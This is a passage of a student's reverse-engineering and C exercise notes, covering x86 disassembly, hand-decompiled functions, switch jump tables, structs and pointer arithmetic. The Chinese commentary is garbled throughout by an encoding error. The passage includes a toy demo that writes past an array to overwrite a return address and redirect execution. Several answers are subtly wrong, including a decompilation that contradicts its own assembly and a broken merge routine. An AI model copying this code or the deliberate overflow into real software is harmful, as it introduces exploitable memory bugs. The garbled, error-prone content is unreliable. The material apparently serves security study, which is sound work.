ç¡®ä¿è¾“å‡ºå­—ç¬¦ä¸²ä»¥'\\0'ç»“å°¾ output[count] = '\\0'; return output; // è¿”å›è¾“å‡ºå­—ç¬¦ä¸² } if 00401030 push ebp\t00401031 mov ebp,esp 00401033 sub esp,44h\t00401036 push ebx\t00401037 push esi\t00401038 push edi 00401039 lea edi,[ebp-44h]\t0040103C mov ecx,11h\t00401041 mov eax,0CCCCCCCCh\t00401046 rep stos dword ptr [edi]\t00401048 mov eax,[004225c4] 0040104D mov dword ptr [ebp-4],eax\t00401050 mov ecx,dword ptr [ebp+8]\t00401053 cmp ecx,dword ptr [ebp+0Ch]\t00401056 jg 00401064\t00401058 mov edx,dword ptr [ebp+0Ch] 0040105B add edx,dword ptr [ebp-4]\t0040105E mov dword ptr [004225c4],edx\t00401064 pop edi\t00401065 pop esi 00401066 pop ebx\t00401067 mov esp,ebp\t00401069 pop ebp\t0040106A ret å‡½æ•°å†…éƒ¨åŠŸèƒ½åˆ†æï¼š\nåˆ†æå‚æ•°\n[ebp+8]:X [ebp+0Ch]:Y åˆ†æå±€éƒ¨å˜é‡\n[ebp-4]=A=[004225c4] åˆ†æå…¨å±€å˜é‡\n[004225c4] = G è¿”å›å€¼åˆ†æ\næ— \nè¿˜åŸæˆCå‡½æ•°\nint A = G; if (X \u003c= Y) { G=Y+A; } return G; 004010B0 push ebp 004010B1 mov ebp,esp 004010B3 sub esp,48h 004010B6 push ebx 004010B7 push esi 004010B8 push edi 004010B9 lea edi,[ebp-48h] 004010BC mov ecx,12h 004010C1 mov eax,0CCCCCCCCh 004010C6 rep stos dword ptr [edi] 004010C8 mov eax,[004225c4] 004010CD mov dword ptr [ebp-4],eax 004010D0 mov dword ptr [ebp-8],2 004010D7 mov ecx,dword ptr [ebp+8] 004010DA cmp ecx,dword ptr [ebp+0Ch] 004010DD jl 004010e8 004010DF mov edx,dword ptr [ebp-8] 004010E2 add edx,1 004010E5 mov dword ptr [ebp-8],edx 004010E8 mov eax,dword ptr [ebp+8] 004010EB cmp eax,dword ptr [ebp+0Ch] 004010EE jge 004010fb 004010F0 mov ecx,dword ptr [ebp-8] 004010F3 mov dword ptr [004225c4],ecx 004010F9 jmp 00401107 004010FB mov edx,dword ptr [ebp-4] 004010FE add edx,dword ptr [ebp-8] 00401101 mov dword ptr [004225c4],edx 00401107 pop edi 00401108 pop esi 00401109 pop ebx 0040110A mov esp,ebp 0040110C pop ebp 0040110D ret å‡½æ•°å†…éƒ¨åŠŸèƒ½åˆ†æï¼š\nåˆ†æå‚æ•°\n[ebp+8]:X [ebp+0Ch]:Y åˆ†æå±€éƒ¨å˜é‡\n[ebp-4]=A=[004225c4] [ebp-8]=B=2 åˆ†æå…¨å±€å˜é‡\n[004225c4] = G è¿”å›å€¼åˆ†æ\næ— \nè¿˜åŸæˆCå‡½æ•°\nint A = G; int B = 2; if(X \u003e= Y) { B=B+2; }else if(X \u003e Y) { G=B; }else { G=A+B; } return G; 004010B0 push ebp 004010B1 mov ebp,esp\t004010B3 sub esp,4Ch 004010B6 push ebx\t004010B7 push esi\t004010B8 push edi\t004010B9 lea edi,[ebp-4Ch] 004010BC mov ecx,13h\t004010C1 mov eax,0CCCCCCCCh\t004010C6 rep stos dword ptr [edi]\t;init 004010C8 mov dword ptr [ebp-4],0\t004010CF mov dword ptr [ebp-8],1 004010D6 mov dword ptr [ebp-0Ch],2\t004010DD mov eax,dword ptr [ebp+8]\t004010E0 cmp eax,dword ptr [ebp+0Ch]\t;x \u003c y 004010E3 jg 004010f0\t004010E5 mov ecx,dword ptr [ebp-8] 004010E8 sub ecx,1\t004010EB mov dword ptr [ebp-4],ecx\t004010EE jmp 00401123\t004010F0 mov edx,dword ptr [ebp+0Ch] 004010F3 cmp edx,dword ptr [ebp+10h]\t;Y \u003e= Z 004010F6 jl 00401103\t004010F8 mov eax,dword ptr [ebp-0Ch]\t004010FB add eax,1 004010FE mov dword ptr [ebp-4],eax\t00401101 jmp 00401123\t00401103 mov ecx,dword ptr [ebp+8]\t00401106 cmp ecx,dword ptr [ebp+10h]\t00401109 jle 00401116\t;X \u003e Z 0040110B mov edx,dword ptr [ebp-8]\t0040110E add edx,dword ptr [ebp-0Ch]\t00401111 mov dword ptr [ebp-4],edx\t00401114 jmp 00401123\t00401116 mov eax,dword ptr [ebp-0Ch]\t00401119 mov ecx,dword ptr [ebp-8]\t0040111C lea edx,[ecx+eax-1]\t00401120 mov dword ptr [ebp-4],edx\t00401123 mov eax,dword ptr [ebp-4]\t00401126 add eax,1\t00401129 pop edi\t0040112A pop esi\t0040112B pop ebx\t0040112C mov esp,ebp\t0040112E pop ebp\t0040112F ret\tå‡½æ•°å†…éƒ¨åŠŸèƒ½åˆ†æï¼š\nåˆ†æå‚æ•°\n[ebp+8]:X [ebp+0Ch]:Y [ebp+10h]:Z åˆ†æå±€éƒ¨å˜é‡\n[ebp-4]=A=0 [ebp-8]=B=1 [ebp-0Ch]=C=2 åˆ†æå…¨å±€å˜é‡\næ— \nè¿”å›å€¼åˆ†æ\næ— \nè¿˜åŸæˆCå‡½æ•°\nint A = 0; int B = 1; int C = 2; if(x \u003c y) { A=B-1; }else if(Y \u003e= Z) { A=C+1; }else if(X \u003e Z) { A=B+C; }else{ A=C+B+1; } A++; return A; æ­£å‘base #include \u003cstdio.h\u003e void HelloWord()\t{\tprintf(\"Hello World\");\tgetchar();\t}\tvoid Fun()\t{\tint arr[5] = {1,2,3,4,5};\tarr[6] = (int)HelloWord;\t//------------------------------------------------ } void main() { Fun(); } è·Ÿè¿›ä»£ç ä¸­æ ‡è¯†çš„é‚£ä¸€è¡Œï¼Œè§‚å¯Ÿæ ˆå¦‚ä¸‹ï¼š\nFun() line 12 main() line 19 mainCRTStartup() line 206 + 25 bytes KERNEL32! 768b5d49() APP01! 772ccebb() APP01! 772cce41() å•æ­¥æ‰§è¡Œåçš„æ ˆå¦‚ä¸‹ï¼š\nFun() line 14 1! @ILT+0(_HelloWord) address 0x00401005 mainCRTStartup() line 206 + 25 bytes KERNEL32! 768b5d49() APP01! 772ccebb() APP01! 772cce41() å¯ä»¥å‘ç°è¿™æ˜¯å°†å‡½æ•°çš„è¿”å›åœ°å€ä¿®æ”¹äº†ï¼Œæ‰€ä»¥å¯ä»¥è°ƒç”¨HelloWordå‡½æ•°ã€‚\n#include \u003cstdio.h\u003e void Fun()\t{\tint i;\tint arr[5] = {0};\tfor(i=0;i\u003c=5;i++)\t{\tarr[i] = 0;\t//--------------------------------------------------- printf(\"Hello World!\\n\");\t}\t}\tvoid main() { Fun(); } å‡½æ•°åœ¨æ‰§è¡Œåˆ°ä»£ç ä¸­æ ‡è¯†çš„é‚£ä¸€è¡Œæ—¶ï¼Œå¦‚æœå¾ªç¯åˆ°ç¬¬5æ¬¡æ—¶ä¼šå‘ç”Ÿæ•°ç»„è¶Šç•Œï¼Œåœ¨IDAçš„å †æ ˆè§†å›¾ä¸­å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°ï¼š\n-000000000000001A db ? ; undefined -0000000000000019 db ? ; undefined -0000000000000018 arr[0] dd ? -0000000000000014 arr[1] dd ? -0000000000000010 arr[2] dd ? -000000000000000C arr[3] dd ? -0000000000000008 arr[4] dd ? -0000000000000004 i dd ?//arr[5] +0000000000000000 s db 4 dup(?) +0000000000000004 r db 4 dup(?) +0000000000000008 +0000000000000008 ; end of stack variables é‡å‘½åä¹‹åå½“i=5æ—¶arr[5] = 0ä¼šæ¸…ç©ºiçš„å€¼ï¼Œæ‰€ä»¥ä¼šå‡ºç°æ— é™å¾ªç¯ã€‚\nå¾ªç¯è¯­å¥ åˆ¤æ–­æ•°ç»„æ˜¯å¦æ˜¯å¯¹ç§°çš„ï¼Œå¦‚æœæ˜¯è¿”å›1ï¼Œä¸æ˜¯è¿”å›0\n#include \u003cstdio.h\u003e int arr[5] = {1,2,3,4,5}; int check() { int i = 0; int mid=0; int count = sizeof(arr) / sizeof(arr[0]); mid = count/2; while(i\u003cmid) { if(arr[i]!=arr[count-1]) { return 0; } i++; count--; } return 1; } int main() { int x = check(); printf(\"%d\\n\",x); } ç¼–å†™ç¨‹åºå®ç°ä¸€ä¸ªå†’æ³¡æ’åºçš„ç®—æ³•\n#include \u003cstdio.h\u003e int arr[10] = {16, 8, 2, 5, 7, 9, 0, 1, 6, 3}; void order() { int count = sizeof(arr) / sizeof(arr[0]); int temp; for (int i = 0; i \u003c count - 1; i++) { for (int j = 0; j \u003c count - 1 - i; j++) { if (arr[j] \u003e arr[j + 1]) { temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; } } } } int main() { order(); for (int i = 0; i \u003c 10; i++) { printf(\"%d\\n\", arr[i]); } return 0; } å‚æ•°-è¿”å›å€¼-æ•°ç»„ è¿”å›å€¼è¶…è¿‡32ä½æ—¶ï¼Œå­˜åœ¨å“ªé‡Œï¼Ÿç”¨long long(__int64)ç±»å‹åšå®éªŒ\nlong longç±»å‹åœ¨VC6ä¸­å¯¹åº”çš„æ˜¯__int64\n__int64 Function() { __int64 x = 0x1234567890; return x; } æŸ¥çœ‹åæ±‡ç¼–å¯ä»¥çœ‹åˆ°ï¼Œå½“è¿”å›å€¼è¶…è¿‡32ä½æ—¶ï¼Œä¼šä½¿ç”¨å¤šä¸ªå¯„å­˜å™¨å°†ç»“æœè¿”å›ï¼š\n6: __int64 x = 0x1234567890; 00401038 mov dword ptr [ebp-8],34567890h 0040103F mov dword ptr [ebp-4],12h 7: return x; 00401046 mov eax,dword ptr [ebp-8] 00401049 mov edx,dword ptr [ebp-4] char arr[3] = {1,2,3};ä¸ char arr[4] = {1,2,3,4};å“ªä¸ªæ›´èŠ‚çœç©ºé—´ï¼Œä»åæ±‡ç¼–çš„è§’åº¦æ¥è¯´æ˜ä½ çš„è§‚ç‚¹\næ ¹æ®åæ±‡ç¼–ï¼Œå…¶å®éƒ½æ˜¯ä¸€ä¸ªåœ°å€ç©ºé—´å­˜å‚¨äº†ä¸€ä¸ªæ•°å­—ï¼š\n8: char arr0[3] = {1,2,3}; 00401028 mov byte ptr [ebp-4],1 0040102C mov byte ptr [ebp-3],2 00401030 mov byte ptr [ebp-2],3 9: char arr1[4] = {1,2,3,4}; 00401034 mov byte ptr [ebp-8],1 00401038 mov byte ptr [ebp-7],2 0040103C mov byte ptr [ebp-6],3 00401040 mov byte ptr [ebp-5],4 ä¸è¿‡è§‚å¯Ÿå†…å­˜å¯ä»¥å‘ç°ï¼Œåœ¨åœ°å€0x19FF2Få¤„è¢«å¯¹é½äº†ï¼Œä¹Ÿå°±æ˜¯è¢«æµªè´¹äº†ï¼š\n0019FF28 01 02 03 04 01 02 03 ....... 0019FF2F CC 70 FF 19 00 49 11 è˜°...I. 0019FF36 40 00 01 00 00 00 A8 @...... æ‰¾å‡ºä¸‹é¢èµ‹å€¼è¿‡ç¨‹çš„åæ±‡ç¼–ä»£ç \nvoid Function() { int x = 1; int y = 2; int r; int arr[10] = {1,2,3,4,5,6,7,8,9,10}; r = arr[1]; r = arr[x]; r = arr[x+y]; r = arr[x*2+y]; } æŠ¬æ ˆçš„æ˜¯00401023 sub esp,74hï¼Œå› ä¸ºéœ€è¦å­˜13ä¸ªå‚æ•°ï¼Œæ¯ä¸ªå‚æ•°å¤§å°ä¸º4ï¼Œæ‰€ä»¥ä¸º13*4=34hï¼ŒåŠ ä¸Šè¦åˆ†é…çš„40hï¼Œå°±æ˜¯74häº†ã€‚\n10: r = arr[1]; 0040108C mov eax,dword ptr [ebp-30h] 0040108F mov dword ptr [ebp-0Ch],eax 11: r = arr[x]; 00401092 mov ecx,dword ptr [ebp-4] 00401095 mov edx,dword ptr [ebp+ecx*4-34h] ;ecx*4ç›¸å½“äºæ•°ç»„å‘åç´¢å¼•çš„åç§» 00401099 mov dword ptr [ebp-0Ch],edx 12: r = arr[x+y]; 0040109C mov eax,dword ptr [ebp-4] 0040109F add eax,dword ptr [ebp-8] 004010A2 mov ecx,dword ptr [ebp+eax*4-34h] 004010A6 mov dword ptr [ebp-0Ch],ecx 13: r = arr[x*2+y]; 004010A9 mov edx,dword ptr [ebp-4] 004010AC mov eax,dword ptr [ebp-8] 004010AF lea ecx,[eax+edx*2] 004010B2 mov edx,dword ptr [ebp+ecx*4-34h] 004010B6 mov dword ptr [ebp-0Ch],edx 14: } æ¡¶æ’åº\n#include \u003cstdio.h\u003e int arr[10] = {1,5,3,8,6,3,7,2,6,3}; int ret[10] = {0}; int order() { int count = sizeof(arr) / sizeof(arr[0]); int t; int j=0; int i=0; for(;i \u003c count;i++){ ret[arr[i]]++; } for(;j \u003c count;j++){ if(ret[j]\u003e0) { t=ret[j]; while(t\u003e0) { printf(\"%d \",j); t--; } } } } void main() { order(); } å¤šç»´æ•°ç»„ å‡è®¾ç°åœ¨æœ‰5ä¸ªç­ï¼Œæ¯ä¸ªç­10ä¸ªäººï¼Œè®¾è®¡ä¸€ä¸ªäºŒç»´æ•°ç»„å­˜å‚¨è¿™äº›äººçš„å¹´é¾„\nint arr[5][10] = {0}; int i = 0; int j = 0; for(;i\u003c5;i++) { for(;j\u003c10;j++) { printf(\"[%d][%d]:\",i+1,j+1); scanf(\"%d\",arr[i][j]); } } å¦‚æœæƒ³çŸ¥é“ç¬¬äºŒä¸ªç­çš„ç¬¬6ä¸ªäººçš„å¹´é¾„ï¼Œåº”è¯¥å¦‚ä½•è·å–ï¼Ÿç¼–è¯‘å™¨è¯¥å¦‚ä½•è·å–ï¼Ÿ\nint memb = 0; memb = arr[1][5]; ===================================================================== arr[1*10+5*1] æ‰“å°æ‰€æœ‰ç­çº§ï¼Œæ‰€æœ‰å­¦ç”Ÿçš„å¹´é¾„ï¼ˆæ¯ä¸ªç­çº§æ‰“å°ä¸€è¡Œï¼‰\nint i = 0; int j = 0; for(;i\u003c5;i++) { for(;j\u003c10;j++) { printf(\"[%d][%d]:%d \",i+1,j+1,arr[i][j]); } printf(\"\\n\"); } å°†ç¬¬äºŒä¸ªç­çº§çš„è¶…è¿‡20å²çš„å­¦ç”Ÿçš„å¹´é¾„ä¿®æ”¹ä¸º21å²\nint j = 0; for(;j\u003c10;j++) { if(arr[1][j]\u003e20) { arr[1][j]=21; } } æ‰“å°å‡ºæ¯ä¸ªç­çº§å­¦ç”Ÿçš„å¹´é¾„çš„å’Œ\nint i = 0; int j = 0; int fin = 0; for(;i\u003c5;i++) { fin=0; for(;j\u003c10;j++) { fin+=arr[i][j]; } printf(\"%d:%d\\n\",i+1,fin); } æ•°ç»„ä¸€ï¼š[3,5,7,9,12,25,34,55]\næ•°ç»„äºŒï¼š[4,7,9,11,13,16]\nå°†ä¸¤ä¸ªæ•°ç»„ä¸­æ‰€æœ‰æ•°æ®è¿›è¡Œä»å°åˆ°å¤§çš„æ’åºï¼Œå­˜å‚¨åˆ°å¦ä¸€ä¸ªæ•°ç»„ä¸­\nint arr1[8] = [3,5,7,9,12,25,34,55]; int arr2[6] = [4,7,9,11,13,16]; int ret[14] = {0}; int i = 0; int j = 0; int k = 0; while(i\u003c8) { while(j\u003c6) { if(arr1[i]\u003carr2[j]) { ret[k] = arr1[i]; k++; break; } else{ ret[k] = arr2[j]; k++; } j++; } i++; } //åº”è¯¥æ˜¯è¿™æ ·å§ ç»“æ„ä½“ å®šä¹‰ä¸€ä¸ªç»“æ„ä½“Gamerç”¨æ¥å­˜å‚¨ä¸€ä¸ªæ¸¸æˆä¸­çš„è§’è‰²çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡€å€¼ã€ç­‰çº§ã€åæ ‡ç­‰ä¿¡æ¯\nè¦æ±‚ï¼š\nå…·ä½“åŒ…å«å“ªäº›ä¿¡æ¯è‡ªç”±è®¾è®¡ ä½†è¿™äº›åŒ…å«çš„ç±»å‹ä¸­ï¼Œå¿…é¡»è¦æœ‰ä¸€ä¸ªæˆå‘˜æ˜¯ç»“æ„ä½“ç±»å‹ struct feature { int i } struct Gamer { short blood; short grade; int x; int y; feature fea } å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥ç»™è¿™ä¸ªç»“æ„ä½“å˜é‡èµ‹å€¼\nvoid function() { Gamer.blood = 100; Gamer.grade = 1; Gamer.x = 1000; Gamer.y = 1000; Gamer.fea.i = 0; } å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥æ˜¾ç¤ºè¿™ä¸ªç»“æ„ä½“å˜é‡çš„æ‰€æœ‰æˆå‘˜ä¿¡æ¯\nvoid function() { printf(\"%d\",Gamer.blood); printf(\"%d\",Gamer.grade); printf(\"%d\",Gamer.x); printf(\"%d\",Gamer.y); printf(\"%d\",Gamer.feature.i); } ç»“æ„ä½“æ•°ç»„ å®šä¹‰ä¸€ä¸ªç»“æ„ä½“Monsterï¼Œèƒ½å¤Ÿå­˜å‚¨æ€ªçš„å„ç§ä¿¡æ¯ï¼ˆè‡³å°‘æœ‰ä¸€ä¸ªæˆå‘˜æ˜¯ç»“æ„ä½“ç±»å‹ï¼‰\nstruct S1\t{\tchar c;\tdouble i;\t}; struct Monster\t{\tint ID;\tdouble blood; int x; int y; S1 s; }; å£°æ˜ä¸€ä¸ªMonsterç±»å‹çš„æ•°ç»„ï¼Œé•¿åº¦ä¸º10\nMonster arr[10]; ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œä¸ºç¬¬äºŒé¢˜ä¸­çš„æ•°ç»„èµ‹å€¼\nvoid fun1() { arr[0].ID = 1145; arr[0].blood = 1000; arr[0].x = 100; arr[0].y = 10; arr[0].s.c = 1; arr[0].s.i = 90; } ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œèƒ½å¤Ÿé€šè¿‡æ€ªç‰©IDï¼Œæ‰“å°å½“å‰è¿™ä¸ªæ€ªç‰©çš„æ‰€æœ‰ä¿¡æ¯\nint i = 0; while(i\u003c10) { if(arr[i].ID==1145) { print(\"%d\\n\",arr[i].blood); print(\"%d\\n\",arr[i].x); print(\"%d\\n\",arr[i].y); print(\"%d\\n\",arr[i].s.c); print(\"%d\\n\",arr[i].s.i); } i++; } åˆ†æä¸‹é¢ç»“æ„ä½“çš„å†…å­˜åˆ†é…ï¼š\nstruct S1\t{\tchar c;\tdouble i;\t}; struct S3\t{\tchar c1; S1 s; char c2; char c3; };\tstruct S4\t{\tchar c1; S1 s; char c2; double c3; };\tstruct S5\t{\tint c1; char c2[10]; };\tS1: c 0 0 0 i i i i S3: c1 0 0 0 c 0 0 0 i i i i c2 c3 0 0 S4: c1 0 0 0 c 0 0 0 i i i i c2 0 0 0 c3 c3 c3 c3 S5: c1 c1 0 0 c2 c2 c2 c2 c2 c2 c2 c2 c2 c2 0 0 //é»˜è®¤8å¯¹é½ Switch å†™ä¸€ä¸ªswitchè¯­å¥ï¼Œä¸ç”Ÿäº§å¤§è¡¨ä¹Ÿä¸ç”Ÿäº§å°è¡¨ï¼Œè´´å‡ºå¯¹åº”çš„åæ±‡ç¼–\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e void fun(x) { switch(x) { case 1: printf(\"1\\n\"); case 2: printf(\"2\\n\"); case 3: printf(\"3\\n\"); } } void main() { fun(2); } 6: switch(x) 7: { 00401038 mov eax,dword ptr [ebp+8] 0040103B mov dword ptr [ebp-4],eax 0040103E cmp dword ptr [ebp-4],1 00401042 je fun+32h (00401052) 00401044 cmp dword ptr [ebp-4],2 00401048 je fun+3Fh (0040105f) 0040104A cmp dword ptr [ebp-4],3 0040104E je fun+4Ch (0040106c) 00401050 jmp fun+59h (00401079) 8: case 1: 9: printf(\"1\\n\"); 00401052 push offset string \"1\\n\" (00422024) 00401057 call printf (004010f0) 0040105C add esp,4 10: case 2: 11: printf(\"2\\n\"); 0040105F push offset string \"2\\n\" (00422020) 00401064 call printf (004010f0) 00401069 add esp,4 12: case 3: 13: printf(\"3\\n\"); 0040106C push offset string \"3\\n\" (0042201c) 00401071 call printf (004010f0) 00401076 add esp,4 14: 15: } 16: } å†™ä¸€ä¸ªswitchè¯­å¥ï¼Œåªç”Ÿæˆå¤§è¡¨ï¼Œè´´å‡ºå¯¹åº”çš„åæ±‡ç¼–\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e void fun(x) { switch(x) { case 1: printf(\"1\\n\"); case 2: printf(\"2\\n\"); case 3: printf(\"3\\n\"); case 4: printf(\"4\\n\"); case 5: printf(\"5\\n\"); case 6: printf(\"6\\n\"); case 7: printf(\"7\\n\"); case 8: printf(\"8\\n\"); case 9: printf(\"9\\n\"); } } void main() { fun(2); } 6: switch(x) 7: { 00401038 mov eax,dword ptr [ebp+8] 0040103B mov dword ptr [ebp-4],eax 0040103E mov ecx,dword ptr [ebp-4] 00401041 sub ecx,1 00401044 mov dword ptr [ebp-4],ecx 00401047 cmp dword ptr [ebp-4],8 0040104B ja $L622+0Dh (004010cc) 0040104D mov edx,dword ptr [ebp-4] 00401050 jmp dword ptr [edx*4+4010DDh] 8: case 1: 9: printf(\"1\\n\"); 00401057 push offset string \"1\\n\" (0042203c) 0040105C call printf (00401180) 00401061 add esp,4 10: case 2: 11: printf(\"2\\n\"); 00401064 push offset string \"2\\n\" (00422038) 00401069 call printf (00401180) 0040106E add esp,4 12: case 3: 13: printf(\"3\\n\"); 00401071 push offset string \"3\\n\" (00422034) 00401076 call printf (00401180) 0040107B add esp,4 14: case 4: 15: printf(\"4\\n\"); 0040107E push offset string \"4\\n\" (00422030) 00401083 call printf (00401180) 00401088 add esp,4 16: case 5: 17: printf(\"5\\n\"); 0040108B push offset string \"5\\n\" (0042202c) 00401090 call printf (00401180) 00401095 add esp,4 18: case 6: 19: printf(\"6\\n\"); 00401098 push offset string \"6\\n\" (00422028) 0040109D call printf (00401180) 004010A2 add esp,4 20: case 7: 21: printf(\"7\\n\"); 004010A5 push offset string \"7\\n\" (00422024) 004010AA call printf (00401180) 004010AF add esp,4 22: case 8: 23: printf(\"8\\n\"); 004010B2 push offset string \"8\\n\" (00422020) 004010B7 call printf (00401180) 004010BC add esp,4 24: case 9: 25: printf(\"9\\n\"); 004010BF push offset string \"9\\n\" (0042201c) 004010C4 call printf (00401180) 004010C9 add esp,4 26: } 27: } 004010DD 57 10 40 00 W.@. ;1 004010E1 64 10 40 00 d.@. ;2 004010E5 71 10 40 00 q.@. ;3 004010E9 7E 10 40 00 ~.@. ;4 004010ED 8B 10 40 00 ..@. ;5 004010F1 98 10 40 00 ..@. ;6 004010F5 A5 10 40 00 ..@. ;7 004010F9 B2 10 40 00 ..@. ;8 004010FD BF 10 40 00 ..@. ;9 å†™ä¸€ä¸ªswitchè¯­å¥ï¼Œç”Ÿæˆå¤§è¡¨å’Œå°è¡¨ï¼Œè´´å‡ºå¯¹åº”çš„åæ±‡ç¼–\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e void fun(x) { switch(x) { case 1: printf(\"1\\n\"); break; case 2: printf(\"2\\n\"); break; case 50: printf(\"50\\n\"); break; case 60: printf(\"60\\n\"); break; } } void main() { fun(2); } 6: switch(x) 7: { 00401038 mov eax,dword ptr [ebp+8] 0040103B mov dword ptr [ebp-4],eax 0040103E mov ecx,dword ptr [ebp-4] 00401041 sub ecx,1 00401044 mov dword ptr [ebp-4],ecx 00401047 cmp dword ptr [ebp-4],3Bh 0040104B ja $L612+0Dh (00401099) 0040104D mov eax,dword ptr [ebp-4] 00401050 xor edx,edx 00401052 mov dl,byte ptr (004010be)[eax] 00401058 jmp dword ptr [edx*4+4010AAh] 8: case 1: 9: printf(\"1\\n\"); 0040105F push offset string \"1\\n\" (00422028) 00401064 call printf (00401170) 00401069 add esp,4 10: break; 0040106C jmp $L612+0Dh (00401099) 11: case 2: 12: printf(\"2\\n\"); 0040106E push offset string \"2\\n\" (00422024) 00401073 call printf (00401170) 00401078 add esp,4 13: break; 0040107B jmp $L612+0Dh (00401099) 14: case 50: 15: printf(\"50\\n\"); 0040107D push offset string \"50\\n\" (00422020) 00401082 call printf (00401170) 00401087 add esp,4 16: break; 0040108A jmp $L612+0Dh (00401099) 17: case 60: 18: printf(\"60\\n\"); 0040108C push offset string \"60\\n\" (0042201c) 00401091 call printf (00401170) 00401096 add esp,4 19: break; 20: } 21: } 004010AA 5F 10 40 00 _.@. 004010AE 6E 10 40 00 n.@. 004010B2 7D 10 40 00 }.@. 004010B6 8C 10 40 00 ..@. 004010BA 99 10 40 00 ..@. 004010BE 00 01 04 04 .... 004010C2 04 04 04 04 .... 004010C6 04 04 04 04 .... 004010CA 04 04 04 04 .... 004010CE 04 04 04 04 .... 004010D2 04 04 04 04 .... 004010D6 04 04 04 04 .... 004010DA 04 04 04 04 .... 004010DE 04 04 04 04 .... 004010E2 04 04 04 04 .... 004010E6 04 04 04 04 .... 004010EA 04 04 04 04 .... 004010EE 04 02 04 04 .... 004010F2 04 04 04 04 .... 004010F6 04 04 04 03 .... ä¸ºdo..whileè¯­å¥ç”Ÿæˆçš„åæ±‡ç¼–å¡«å†™æ³¨é‡Š\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e void fun(x) { do { x++; } while(x\u003e20); } void main() { fun(2); } 6: do 7: { 8: x++; 00401038 mov eax,dword ptr [ebp+8];å°†å‚æ•°ä¼ ç»™eax 0040103B add eax,1 0040103E mov dword ptr [ebp+8],eax;x++æ“ä½œ 9: } 10: while(x\u003e20); 00401041 cmp dword ptr [ebp+8],14h;å‚æ•°ä¸14h=20æ¯”è¾ƒ 00401045 jg fun+18h (00401038);å¤§äºå°±è·³è½¬ï¼Œå°±æ˜¯è·³å‡ºäº† 11: } ä¸ºwhileè¯­å¥ç”Ÿæˆçš„åæ±‡ç¼–å¡«å†™æ³¨é‡Š\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e void fun(x) { while(x\u003c20) { printf(\"%d\\n\",x); x++; } } void main() { fun(2); } 6: 7: while(x\u003e20) 00401038 cmp dword ptr [ebp+8],14h;é¦–å…ˆä¸20è¿›è¡Œæ¯”è¾ƒ 0040103C jge fun+3Ah (0040105a);å¤§äºç­‰äºå°±è·³è½¬ï¼Œç›¸å½“äºè·³å‡ºå¾ªç¯ 8: { 9: printf(\"%d\\n\",x); 0040103E mov eax,dword ptr [ebp+8] 00401041 push eax 00401042 push offset string \"%d\\n\" (0042201c) 00401047 call printf (004010c0) 0040104C add esp,8;å°†å‚æ•°æ‰“å°çš„æ“ä½œ 10: x++; 0040104F mov ecx,dword ptr [ebp+8] 00401052 add ecx,1 00401055 mov dword ptr [ebp+8],ecx;å°†å‚æ•°è‡ªå¢1çš„æ“ä½œ 11: } 00401058 jmp fun+18h (00401038);å›åˆ°å¾ªç¯çš„å¼€å§‹ 12: } ä¸ºforè¯­å¥ç”Ÿæˆçš„åæ±‡ç¼–å¡«å†™æ³¨é‡Š\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e void fun(x) { int i = 0; for(;i\u003c20;i++) { printf(\"%d\\n\",x); x++; } } void main() { fun(2); } 7: for(;i\u003e20;i++) 0040103F jmp fun+2Ah (0040104a) 00401041 mov eax,dword ptr [ebp-4] 00401044 add eax,1;i++æ“ä½œ 00401047 mov dword ptr [ebp-4],eax 0040104A cmp dword ptr [ebp-4],14h;é¦–æ¬¡å¼€å§‹æ‰§è¡Œçš„åœ°æ–¹ 0040104E jge fun+4Ch (0040106c);å¤§äºç­‰äºå°±è·³è½¬ï¼Œç›¸å½“äºè·³å‡ºå¾ªç¯äº† 8: { 9: printf(\"%d\\n\",x); 00401050 mov ecx,dword ptr [ebp+8] 00401053 push ecx 00401054 push offset string \"%d\\n\" (0042201c) 00401059 call printf (004010e0) 0040105E add esp,8;è‡ªå·±å®šä¹‰çš„æ‰“å°æ“ä½œ 10: x++; 00401061 mov edx,dword ptr [ebp+8] 00401064 add edx,1 00401067 mov dword ptr [ebp+8],edx;x++æ“ä½œ 11: } 0040106A jmp fun+21h (00401041);è·³åˆ°i++çš„åœ°æ–¹äº† 12: } æŒ‡é’ˆ charç±»å‹å å‡ å­—èŠ‚ï¼Ÿchar*ç±»å‹å å‡ å­—èŠ‚ï¼Ÿint*****å å‡ å­—èŠ‚ï¼Ÿ\ncharå 1ä¸ªå­—èŠ‚ï¼Œchar*å 4ä¸ªå­—èŠ‚ï¼Œint*****å 4ä¸ªå­—èŠ‚ char** arr[10]å å¤šå°‘ä¸ªå­—èŠ‚ï¼Ÿ\nå‰é¢char**æ˜¯4ä¸ªå­—èŠ‚ï¼Œåé¢æœ‰10é¡¹ï¼Œæ‰€ä»¥æ˜¯40ä¸ªå­—èŠ‚ è‡ªå®šä¹‰ç»“æ„ä½“å¦‚ä¸‹ï¼š\nstruct Student { int x; int y; }; ç¬¬ä¸€æ­¥ï¼š\nStudent**** s; s = (Student****)100; s++;\t//sçš„å€¼æ˜¯å¤šå°‘ï¼Ÿ\t104 s = s+2;\t//sçš„å€¼æ˜¯å¤šå°‘ï¼Ÿ\t112 s = s-3;\t//sçš„å€¼æ˜¯å¤šå°‘ï¼Ÿ\t100 ç¬¬äºŒæ­¥ï¼š\nStudent**** s1;\tStudent**** s2;\tint x;\ts1 = (Student****)200;\ts2 = (Student****)100;\tx = s1-s2;\t//xçš„å€¼æ˜¯å¤šå°‘ï¼Ÿ\t25 ç¬¬ä¸‰æ­¥ï¼š\nStudent* s;\ts = (Student*)100;\ts++;\t//sçš„å€¼æ˜¯å¤šå°‘ï¼Ÿ\t108 s = s+2;\t//sçš„å€¼æ˜¯å¤šå°‘ï¼Ÿ\t124 s = s-3;\t//sçš„å€¼æ˜¯å¤šå°‘ï¼Ÿ\t100 ç¬¬å››æ­¥ï¼š\nStudent* s1;\tStudent* s2;\tint x;\ts1 = (Student*)200;\ts2 = (Student*)100;\tx = 